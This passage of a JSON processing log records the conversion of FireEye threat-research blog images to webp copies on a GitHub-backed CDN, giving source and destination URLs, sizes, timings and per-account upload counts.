22:11:19","host":"europe66*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/code-grafting-to-unpack-malware-in-emulation.html","linkMd5ListStr":"6e300db7afe3b0d6d31a9de593949d0c","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"292.5 KB","destSize":"65.3 KB","compressRate":"22.3%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table2irongate.jpg","sourceStatusCode":200,"destWidth":925,"destHeight":504,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn58@2020_4/2020/08/24/14-11-20-780_d4d831b85fe6c034.webp","sourceBytes":82126,"destBytes":47916,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2043,"convertSpendMs":42,"createdTime":"2020-08-24 22:11:20","host":"europe-59*","referer":"http://www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html","linkMd5ListStr":"7d0fa0863298f7f7957d012cb5756f76","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"80.2 KB","destSize":"46.8 KB","compressRate":"58.3%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/1-300x138.png","sourceStatusCode":200,"destWidth":300,"destHeight":138,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn95@2020_3/2020/08/24/14-11-21-246_a6e3952bdcdd560d.webp","sourceBytes":21121,"destBytes":3428,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1666,"convertSpendMs":4,"createdTime":"2020-08-24 22:11:20","host":"europe-56*","referer":"http://www.fireeye.com/blog/threat-research/2012/06/unibody-memory-analysis-introducing-mac-memoryze.html","linkMd5ListStr":"16a19d4ec8922804719feaf1761ca63d","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.6 KB","destSize":"3.3 KB","compressRate":"16.2%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture7.png","sourceStatusCode":200,"destWidth":1050,"destHeight":537,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn23@2020_5/2020/08/24/14-11-21-174_14f0f977e6bf7908.webp","sourceBytes":243985,"destBytes":79944,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1649,"convertSpendMs":499,"createdTime":"2020-08-24 22:11:20","host":"us-032*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/code-grafting-to-unpack-malware-in-emulation.html","linkMd5ListStr":"6e300db7afe3b0d6d31a9de593949d0c","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"238.3 KB","destSize":"78.1 KB","compressRate":"32.8%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ploutus%20Variant%20Daniel%20Regalado/Fig2.png","sourceStatusCode":200,"destWidth":512,"destHeight":175,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn20@2020_6/2020/08/24/14-11-21-403_d0cd08e6f33cf940.webp","sourceBytes":8119,"destBytes":20198,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1725,"convertSpendMs":517,"createdTime":"2020-08-24 22:11:20","host":"us-013*","referer":"http://www.fireeye.com/blog/threat-research/2017/01/new_ploutus_variant.html","linkMd5ListStr":"e71d772c6d67c49bd9e8d753bf9dc53a","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.9 KB","destSize":"19.7 KB","compressRate":"248.8%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/scandalous/Picture2a.jpg","sourceStatusCode":200,"destWidth":800,"destHeight":640,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn16@2020_6/2020/08/24/14-11-21-237_ea12739d405033fe.webp","sourceBytes":63745,"destBytes":42386,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1815,"convertSpendMs":23,"createdTime":"2020-08-24 22:11:20","host":"europe69*","referer":"http://www.fireeye.com/blog/threat-research/2020/07/scandalous-external-detection-using-network-scan-data-and-automation.html","linkMd5ListStr":"ebbd6b95ce31265830e4525f9b1c57b3","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"62.3 KB","destSize":"41.4 KB","compressRate":"66.5%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/masslogger/figure17.png","sourceStatusCode":200,"destWidth":1006,"destHeight":500,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn27@2020_2/2020/08/24/14-11-21-299_a6e7e93dd6720d2c.webp","sourceBytes":243694,"destBytes":48100,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1963,"convertSpendMs":25,"createdTime":"2020-08-24 22:11:20","host":"europe62*","referer":"http://www.fireeye.com/blog/threat-research/2020/08/bypassing-masslogger-anti-analysis-man-in-the-middle-approach.html","linkMd5ListStr":"9a7bbc41e123c400b9944084b8bf8adf","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"238 KB","destSize":"47 KB","compressRate":"19.7%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture12.png","sourceStatusCode":200,"destWidth":943,"destHeight":733,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn81@2020_5/2020/08/24/14-11-21-114_227c7880398de56e.webp","sourceBytes":262411,"destBytes":77126,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2268,"convertSpendMs":54,"createdTime":"2020-08-24 22:11:20","host":"europe68*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/code-grafting-to-unpack-malware-in-emulation.html","linkMd5ListStr":"6e300db7afe3b0d6d31a9de593949d0c","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"256.3 KB","destSize":"75.3 KB","compressRate":"29.4%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/dynamicanalysis/Picture7.png","sourceStatusCode":200,"destWidth":1068,"destHeight":664,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn7@2020_5/2020/08/24/14-11-21-712_74c010f4667b0d81.webp","sourceBytes":84245,"destBytes":49828,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1311,"convertSpendMs":41,"createdTime":"2020-08-24 22:11:21","host":"us-017*","referer":"http://www.fireeye.com/blog/threat-research/2020/07/configuring-windows-domain-dynamically-analyze-obfuscated-lateral-movement-tool.html","linkMd5ListStr":"e1bf3a686b04aa63d07c105c1bc6bebc","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"82.3 KB","destSize":"48.7 KB","compressRate":"59.1%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/stimulusphishing/Picture5.png","sourceStatusCode":200,"destWidth":750,"destHeight":420,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn100@2020_3/2020/08/24/14-11-21-500_6931adcfd2bb374a.webp","sourceBytes":49724,"destBytes":25912,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2113,"convertSpendMs":16,"createdTime":"2020-08-24 22:11:20","host":"europe21*","referer":"http://www.fireeye.com/blog/threat-research/2020/03/stimulus-bill-social-engineering-covid-19-financial-compensation-schemes.html","linkMd5ListStr":"87ecde25963f6cc24b43fc09fa2ca09c","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"48.6 KB","destSize":"25.3 KB","compressRate":"52.1%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/ammo/auditparser-screengrab4-1024x496.jpg","sourceStatusCode":200,"destWidth":1024,"destHeight":496,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn3@2020_5/2020/08/24/14-11-21-833_e3db08b486a95732.webp","sourceBytes":58232,"destBytes":34320,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":2167,"convertSpendMs":982,"createdTime":"2020-08-24 22:11:20","host":"us-013*","referer":"http://www.fireeye.com/blog/threat-research/2012/07/freeware-tool-audit-parser-tm.html","linkMd5ListStr":"b84b37c3e9f54bfc31e53c4e61376e0e","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"56.9 KB","destSize":"33.5 KB","compressRate":"58.9%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/legacy/blog/2014/07/Screen-Shot-2014-07-17-at-12.43.48-PM.png","sourceStatusCode":200,"destWidth":1070,"destHeight":978,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn24@2020_6/2020/08/24/14-11-24-662_e49379a98de63f20.webp","sourceBytes":133787,"destBytes":114174,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":1386,"convertSpendMs":88,"createdTime":"2020-08-24 22:11:24","host":"us-028*","referer":"http://www.fireeye.com/blog/threat-research/2014/07/havex-its-down-with-opc.html","linkMd5ListStr":"35f63f48f41b28cfeea2d095e218ea2f","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"130.7 KB","destSize":"111.5 KB","compressRate":"85.3%"},{"code":1,"isDone":false,"source":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/fakenetgenie/Picture16.gif","sourceStatusCode":200,"destWidth":991,"destHeight":1212,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn63@2020_5/2020/08/24/14-11-29-286_64ce90c1f57e6bd7.webp","sourceBytes":218393,"destBytes":265820,"targetWebpQuality":75,"feedId":1226,"totalSpendMs":18494,"convertSpendMs":16843,"createdTime":"2020-08-24 22:11:12","host":"us-032*","referer":"http://www.fireeye.com/blog/threat-research/2020/04/improving-dynamic-malware-analysis-with-cheat-codes-for-fakenet-ng.html","linkMd5ListStr":"e8663eab08103ac5aaf0af8901259b03","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"213.3 KB","destSize":"259.6 KB","compressRate":"121.7%"}],"successGithubMap":{"myreaderx14":14,"myreaderx8":13,"myreaderx15":13,"myreaderx7":12,"myreaderx6":12,"myreaderx16":12,"myreaderx10":14,"myreaderx4":14,"myreaderx32":14,"myreaderx3":13,"myreaderx33":12,"myreaderx11":13,"myreaderx2":13,"myreaderx12":12,"myreaderx1":11,"myreaderx13":12,"myreaderx30":14,"myreaderx31":11,"myreaderx18":12,"myreaderx19":13,"myreaderx":12,"myreaderx25":13,"myreaderx27":11,"myreaderx21":12,"myreaderx22":13,"myreaderx23":11,"myreaderx24":13,"myreaderx5oss":13,"myreaderx29":13},"failGithubMap":{}}